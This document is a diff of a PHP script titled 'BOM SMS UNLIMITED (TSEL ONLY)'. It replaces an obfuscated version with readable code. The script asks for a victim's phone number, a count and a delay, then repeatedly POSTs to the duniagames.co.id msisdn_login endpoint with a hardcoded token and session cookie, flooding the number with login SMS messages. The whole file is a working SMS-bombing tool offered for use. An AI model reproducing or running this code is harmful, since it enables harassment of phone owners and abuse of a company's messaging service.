@@ -1,8 +1,48 @@
 <?php
-/*   __________________________________________________
-    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.0   |
-    |              on 2018-11-29 06:08:16              |
-    |    GitHub: https://github.com/pk-fr/yakpro-po    |
-    |__________________________________________________|
-*/
-goto XYULe; D8xh5: $COnn_ = trim(fgets(STDIN)); goto jfYti; jfYti: echo "\112\x65\x64\141\77\x20\x28\145\170\40\72\x20\x31\55\x31\x30\x29\xa\x49\156\x70\x75\164\x20\x3a\40"; goto FFrml; XYULe: function TDMJJ($jMH9R, $dwCxB, $KzzBd) { goto ifVu0; Wr_CV: sleep($KzzBd); goto TumDe; gpHoi: ymBBm: goto Uyihj; uppHC: $cA9kM[] = "\103\157\x6e\156\x65\143\x74\151\157\156\x3a\40\x6b\x65\x65\160\55\141\x6c\151\166\x65"; goto imqHF; LtzTa: $cA9kM[] = "\104\x6e\164\x3a\40\x31"; goto uppHC; Uh90u: eECVR($aKEj6, PwFQx, true); goto PdIAq; akEd2: $cA9kM[] = "\x41\143\143\x65\x70\x74\x2d\x4c\x61\156\147\165\141\x67\145\72\40\x65\156\55\125\123\x2c\145\x6e\x3b\161\75\60\x2e\65"; goto rnxkb; AylP1: eecVr($aKEj6, PwFQx, 1); goto f0gpK; GzHCx: EEcvR($aKEj6, GlZ5_, 0); goto c54cG; lQBe0: $apkUq = mDg1t($aKEj6); goto Zkng1; ifVu0: $F3kOA = 0; goto xzE3H; vb_Xq: EECvR($aKEj6, s5I0p, $cA9kM); goto lQBe0; xzE3H: Zlk3n: goto dT5Kp; hWRmP: $cA9kM[] = "\103\157\x6e\x74\x65\x6e\x74\x2d\124\171\x70\145\x3a\40\x61\160\160\x6c\x69\143\141\x74\x69\157\156\x2f\x78\55\167\x77\167\x2d\146\x6f\162\x6d\55\x75\x72\x6c\x65\x6e\143\x6f\x64\145\x64\x3b\x20\x63\150\141\162\163\145\x74\x3d\x55\x54\x46\x2d\x38"; goto Td1ML; Uyihj: BmW8N($aKEj6); goto jgOxW; tQS1e: echo "\x45\162\162\157\x72\72" . PgI1f($aKEj6); goto gpHoi; dT5Kp: if (!($F3kOA < $dwCxB)) { goto tmrrn; } goto vNsDY; Zkng1: if (!k_ITO($aKEj6)) { goto ymBBm; } goto tQS1e; Td1ML: $cA9kM[] = "\130\55\122\x65\x71\x75\145\163\x74\145\144\x2d\127\151\x74\150\x3a\40\130\x4d\114\x48\164\x74\160\x52\145\x71\x75\x65\163\164"; goto LtzTa; vNsDY: $aKEj6 = KNbz3(); goto UxCOu; imqHF: $cA9kM[] = "\x43\157\x6f\x6b\x69\145\72\40\x58\x53\x52\x46\x2d\124\x4f\x4b\x45\x4e\75\x65\171\x4a\x70\144\x69\x49\66\x49\153\x70\151\x59\126\106\65\143\x48\160\x59\x4f\110\x4e\127\116\x55\116\x6c\132\155\144\62\x4e\155\x4a\123\122\x56\x45\71\120\x53\111\x73\x49\x6e\x5a\x68\x62\x48\x56\154\x49\152\157\x69\x62\62\x31\x53\123\x6b\x5a\x76\x64\105\x4e\116\115\x30\105\x31\123\105\122\157\x55\x44\102\156\124\x6a\153\x32\124\x56\167\x76\141\x6b\116\x33\122\x57\x6b\x72\x4f\x43\x74\165\115\125\125\x33\x4f\130\154\x53\x63\62\61\x4c\127\107\164\x57\132\60\153\170\143\x6a\x64\x4d\x51\x6e\x4e\123\144\x6c\122\x33\132\x47\70\x78\x54\126\x6f\171\x62\60\170\63\115\107\x31\156\x53\x31\x4a\x52\x61\x47\126\x73\x61\61\122\x57\x4d\105\x46\124\x5a\152\150\x58\141\x56\x5a\102\120\x54\60\x69\x4c\x43\112\164\x59\127\115\x69\x4f\151\111\171\x5a\124\125\x79\x5a\x44\x67\x33\x4d\107\x55\x32\116\62\x52\x6a\x5a\152\144\151\x59\x6a\x45\64\115\62\111\172\x4d\107\x51\167\132\104\106\x68\x4e\62\126\x68\115\x6d\121\x7a\116\x32\x55\x79\x5a\x47\122\154\x4e\107\x55\172\x4e\x44\144\x6c\x5a\124\154\150\x4e\124\x5a\x6c\132\104\x5a\151\x4e\x6d\x4d\x30\115\x6d\111\62\131\152\105\x78\111\156\60\45\42\63\x44\73"; goto vb_Xq; f0gpK: eEcvr($aKEj6, SaAZF, "\155\163\151\163\x64\156\x3d" . $jMH9R . "\46\x74\157\x6b\145\x6e\x3d\x57\x44\145\x74\63\x6c\x31\x48\x66\144\x68\x76\147\155\x59\103\x56\x54\x53\154\x66\x4b\110\x43\x69\111\104\65\x53\x6a\115\101\x4d\156\x38\x57\x6c\71\151\130"); goto FaxkL; v04p6: $cA9kM = array(); goto gz65Z; PdIAq: EEcVR($aKEj6, SG9bc, true); goto GzHCx; mgfbm: goto Zlk3n; goto Fj5zj; D17Dk: $cA9kM[] = "\101\143\x63\x65\160\x74\x3a\40\141\160\160\154\x69\143\141\x74\x69\157\x6e\x2f\152\x73\157\156\x2c\x20\x74\145\170\164\57\x6a\141\x76\141\163\143\162\151\160\164\x2c\40\52\57\x2a\73\40\161\75\60\x2e\60\61"; goto akEd2; c54cG: eecVR($aKEj6, LqBYh, 0); goto v04p6; UxCOu: EECvR($aKEj6, JTmzA, "\x68\x74\164\x70\163\x3a\x2f\57\144\165\156\x69\141\x67\141\155\145\x73\56\143\157\x2e\x69\x64\57\141\x70\151\57\x6d\163\151\163\144\156\137\x6c\x6f\x67\151\156"); goto AylP1; rnxkb: $cA9kM[] = "\122\145\x66\145\162\145\162\72\x20\150\x74\164\160\163\x3a\57\57\x64\165\x6e\x69\141\x67\x61\x6d\x65\163\56\x63\157\x2e\x69\x64\57\x6c\157\147\151\156"; goto hWRmP; FaxkL: eeCVr($aKEj6, O6JFb, 1); goto O5Sq5; CePGl: flush(); goto mgfbm; O5Sq5: eecVr($aKEj6, G37aW, "\x67\172\151\160\x2c\x20\x64\x65\146\154\141\164\145"); goto Uh90u; gz65Z: $cA9kM[] = "\x55\163\x65\x72\55\101\x67\145\156\164\72\x20\x4d\157\172\x69\154\154\x61\x2f\65\56\60\40\50\x57\151\156\144\157\167\x73\x20\116\x54\40\66\x2e\x31\x3b\40\x57\151\x6e\66\x34\73\x20\x78\x36\x34\73\x20\162\166\72\x36\63\56\x30\x29\40\x47\x65\x63\x6b\x6f\x2f\62\x30\61\x30\x30\x31\x30\61\x20\106\151\x72\x65\x66\157\x78\57\x36\63\56\x30"; goto D17Dk; TumDe: $F3kOA++; goto CePGl; jgOxW: echo $apkUq . "\xa"; goto Wr_CV; Fj5zj: tmrrn: goto DWErf; DWErf: } goto Tm8Ap; tzYkY: echo "\112\x75\155\x6c\141\x68\77\12\111\156\160\165\x74\x20\72\x20"; goto D8xh5; V3eun: $Oh0bD = TDMjj($Ugg7z, $COnn_, $Q3rdi); goto Ntvzs; Tm8Ap: print "\102\x4f\x4d\40\x53\x4d\x53\40\x55\116\x4c\x49\115\111\x54\105\x44\40\50\124\123\x45\114\40\x4f\116\114\131\51"; goto k0j3e; FFrml: $Q3rdi = trim(fgets(STDIN)); goto V3eun; Tg78m: $Ugg7z = trim(fgets(STDIN)); goto tzYkY; k0j3e: echo "\x4e\x6f\x6d\157\x72\77\x20\x28\145\170\x20\72\x20\x36\62\x78\170\170\x78\x29\12\x49\156\x70\165\164\x20\x3a\x20"; goto Tg78m; Ntvzs: print $Oh0bD;
+function jdidbom($no, $jum, $wait) {
+    $x = 0;
+    while ($x < $jum) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://duniagames.co.id/api/msisdn_login");
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=" . $no . "&token=WDet3l1HfdhvgmYCVTSlfKHCiID5SjMAMn8Wl9iX");
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+
+        $headers = array();
+        $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0";
+        $headers[] = "Accept: application/json, text/javascript, */*; q=0.01";
+        $headers[] = "Accept-Language: en-US,en;q=0.5";
+        $headers[] = "Referer: https://duniagames.co.id/login";
+        $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
+        $headers[] = "X-Requested-With: XMLHttpRequest";
+        $headers[] = "Dnt: 1";
+        $headers[] = "Connection: keep-alive";
+        $headers[] = "Cookie: XSRF-TOKEN=eyJpdiI6IkpiYVF5cHpYOHNWNUNlZmd2NmJSRVE9PSIsInZhbHVlIjoib21SSkZvdENNM0E1SERoUDBnTjk2TVwvakN3RWkrOCtuMUU3OXlSc21LWGtWZ0kxcjdMQnNSdlR3ZG8xTVoyb0x3MG1nS1JRaGVsa1RWMEFTZjhXaVZBPT0iLCJtYWMiOiIyZTUyZDg3MGU2N2RjZjdiYjE4M2IzMGQwZDFhN2VhMmQzN2UyZGRlNGUzNDdlZTlhNTZlZDZiNmM0MmI2YjExIn0%\"3D;";
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);        
+        $server_output = curl_exec($ch);
+        if (curl_errno($ch)) {
+            echo 'Error:' . curl_error($ch);
+        }
+        curl_close($ch);
+        echo $server_output . "\n";
+        sleep($wait);
+        $x++;
+        flush();
+    }
+}
+
+print "BOM SMS UNLIMITED (TSEL ONLY)";
+echo "Nomor? (ex : 62xxxx)\nInput : ";
+$nomor = trim(fgets(STDIN));
+echo "Jumlah?\nInput : ";
+$jumlah = trim(fgets(STDIN));
+echo "Jeda? (ex : 1-10)\nInput : ";
+$jeda = trim(fgets(STDIN));
+$execute = jdidbom($nomor, $jumlah, $jeda);
+print $execute;
+?>
